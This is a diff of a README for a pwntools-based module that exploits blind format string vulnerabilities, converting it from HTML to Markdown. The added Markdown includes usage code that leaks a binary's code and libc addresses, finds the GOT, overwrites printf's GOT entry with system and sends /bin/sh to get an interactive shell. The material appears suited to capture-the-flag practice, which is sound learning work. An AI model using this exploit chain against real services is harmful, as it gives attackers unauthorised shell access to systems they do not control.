@@ -1,9 +1,41 @@
-<h1> Blind Format String Exploitation </h1>
-<p>     This is a module to exploit blind format string vulnerability  </p>
-<p> <b> Steps For Exploitation </b> </p>
-<p> 1) leak the code </p>
-<p> 2) leak Libc usinf pwntools Dynelf module </p>
-<p> 3) leak .dynamic ptr and then GOT table addr </p>
-<p> 4) leak printf_got </p>
-<p> 5) Overwrite printf_got with system addr </p>
-<p> 6) send /bin/sh </p>
+## Blind Format String Exploitation 
+This is a module to exploit blind format string vulnerability  
+
+### How to use it ?
+```python
+from pwn import *
+from frmstr import *
+
+p = process('blind')
+saveSocket = p
+
+base_addr = 0x08048000
+
+data = leak_code(p,0x0804852b,0x100)
+print disasm(data,arch='i386')
+d, dynamic_ptr = leak_libc_ptr(p,base_addr)
+system_libc  = leak_libc(d,'system')
+fprintf_libc = leak_libc(d,'fprintf')
+
+got_addr = find_got(p,dynamic_ptr)
+printf_got = resolve_got(got_addr, fprintf_libc)
+
+send_payload(p,printf_got, system_libc,6)
+p.sendline('/bin/sh\x00')
+p.interactive()
+p.close()
+
+```
+
+#### Steps For Exploitation
+1) leak the code
+
+2) leak Libc usinf pwntools Dynelf module
+
+3) leak .dynamic ptr and then GOT table addr 
+
+4) leak printf_got
+
+5) Overwrite printf_got with system addr </p>
+
+6) send /bin/sh 
